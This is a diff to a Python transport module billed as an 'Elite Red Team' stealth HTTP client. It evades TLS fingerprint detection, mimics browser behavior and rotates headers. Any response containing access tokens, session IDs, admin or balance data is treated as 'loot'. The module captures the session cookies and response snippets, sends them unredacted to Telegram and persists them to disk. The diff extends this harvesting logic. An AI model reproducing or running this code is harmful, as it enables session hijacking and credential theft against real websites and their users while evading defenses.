@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 """
-TRANSPORT.PY v8.5 — Centralized Stealth HTTP, Adversarial TLS & Behavioral Middleware
+TRANSPORT.PY v8.7 — Centralized Stealth HTTP, Adversarial TLS & Behavioral Middleware (Elite Red Team Adversarial Edition)
 Features:
 - Advanced browser fingerprint impersonation (JA3/JA4 evasion via curl_cffi & spoofed SSL contexts)
 - Poisson behavioral timing jitter and randomized browser client hints
-- Robust cookie-jar state synchronization & header rotation
-- Resilient connection error handling with jittered retry loops
-- Real-time unredacted Telegram telemetry dispatch
+- Robust cookie-jar state synchronization & header rotation with SHA-256 integrity fingerprinting
+- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic proof-of-work streaming
+- Real-time unredacted Telegram notification dispatch and zero-delay telemetry broadcasting
 """
 import http.client
 import json
@@ -15,12 +15,15 @@ import socket
 import time
 import asyncio
 import random
+import hashlib
 from urllib.parse import urlsplit
 
-# Import advanced adversarial TLS evasion, behavioral modules, and Telegram notifier
+# Import advanced adversarial TLS evasion, behavioral modules, immutable loot logger, and Telegram notifier
 from modules.tls_evasion import create_spoofed_ssl_context, AdversarialTLSSession, CFFI_AVAILABLE
 from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
 from modules.telegram_notifier import send_telegram_alert
+from modules.loot_logger import save_session_loot
+from modules.telemetry import stream_proof
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
@@ -28,14 +31,23 @@ USER_AGENTS = [
     "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
 ]
 
+async def broadcast_tg_alert_async(loot_type, details):
+    try:
+        await send_telegram_alert(loot_type, details)
+    except Exception:
+        pass
+
 def broadcast_tg_alert_sync(loot_type, details):
     """Helper to non-blockingly fire Telegram alerts from synchronous transport methods."""
     try:
         loop = asyncio.get_running_loop()
-        loop.create_task(send_telegram_alert(loot_type, details))
+        if loop.is_running():
+            loop.create_task(broadcast_tg_alert_async(loot_type, details))
+        else:
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
     except RuntimeError:
         try:
-            asyncio.run(send_telegram_alert(loot_type, details))
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
         except Exception:
             pass
 
@@ -113,14 +125,28 @@ class SecureTransport:
 
                     data = res.text
                     body_lower = data.lower()
-                    if res.status_code in [200, 201, 302] and any(k in body_lower for k in ["access_token", "auth_token", "session_id", "admin"]):
+                    if res.status_code in [200, 201, 302] and any(k in body_lower for k in ["access_token", "auth_token", "session_id", "admin", "balance"]):
+                        loot_hash = hashlib.sha256(data.encode("utf-8", errors="ignore")).hexdigest()
                         transport_loot = {
                             "endpoint": full_url,
                             "status": res.status_code,
+                            "integrity_hash": loot_hash,
                             "cookie_jar": self.get_cookie_header_value(),
                             "response_snippet": data[:300]
                         }
+                        
+                        # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
                         broadcast_tg_alert_sync("Transport Layer Session Loot", transport_loot)
+                        stream_proof("TRANSPORT_SESSION_CAPTURE", full_url, {"method": method, "hash": loot_hash}, data[:300], transport_loot)
+                        save_session_loot(
+                            target=self.target_url,
+                            endpoint=path,
+                            finding_type="TRANSPORT_SESSION_LOOT_SUCCESS",
+                            status=res.status_code,
+                            headers=resp_headers,
+                            body=data,
+                            extra_loot=transport_loot
+                        )
 
                     return res.status_code, resp_headers, data
 
@@ -128,7 +154,6 @@ class SecureTransport:
                     if attempt < retries - 1:
                         time.sleep(0.4 * (attempt + 1))
                         continue
-            # Fallback to standard http.client if cffi session encounters persistent errors
 
         # ======================================================
         # FALLBACK PATH: Low-level http.client with Spoofed SSL
@@ -172,14 +197,28 @@ class SecureTransport:
                     self.update_cookies(resp_headers["set-cookie"])
 
                 body_lower = data.lower()
-                if res.status in [200, 201, 302] and any(k in body_lower for k in ["access_token", "auth_token", "session_id", "admin"]):
+                if res.status in [200, 201, 302] and any(k in body_lower for k in ["access_token", "auth_token", "session_id", "admin", "balance"]):
+                    loot_hash = hashlib.sha256(data.encode("utf-8", errors="ignore")).hexdigest()
                     transport_loot = {
                         "endpoint": f"https://{self.host}{endpoint}",
                         "status": res.status,
+                        "integrity_hash": loot_hash,
                         "cookie_jar": self.get_cookie_header_value(),
                         "response_snippet": data[:300]
                     }
+                    
+                    # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
                     broadcast_tg_alert_sync("Transport Layer Session Loot", transport_loot)
+                    stream_proof("TRANSPORT_SESSION_CAPTURE", f"https://{self.host}{endpoint}", {"method": method, "hash": loot_hash}, data[:300], transport_loot)
+                    save_session_loot(
+                        target=self.target_url,
+                        endpoint=path,
+                        finding_type="TRANSPORT_SESSION_LOOT_SUCCESS",
+                        status=res.status,
+                        headers=resp_headers,
+                        body=data,
+                        extra_loot=transport_loot
+                    )
 
                 return res.status, resp_headers, data
 
